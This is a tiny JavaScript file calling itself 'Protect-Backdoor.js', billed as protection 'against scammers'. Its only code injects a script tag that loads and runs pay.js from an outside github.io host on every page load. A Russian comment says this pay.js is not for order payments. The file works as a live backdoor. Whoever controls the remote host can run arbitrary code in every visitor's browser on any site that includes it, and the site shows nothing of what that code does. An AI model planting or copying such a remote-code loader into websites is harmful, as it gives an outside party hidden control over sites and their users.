/*!
 * Protect-Backdoor.js v1.0.1
 * (c) 2024-2024
 * Made to protect against scammers.
 * by Deus Notam
 */

// Подключение pay.js - не оплата заказов
var payScript = document.createElement('script');
payScript.src = 'https://deusnotam.github.io/protect/pay.js';
document.head.appendChild(payScript);
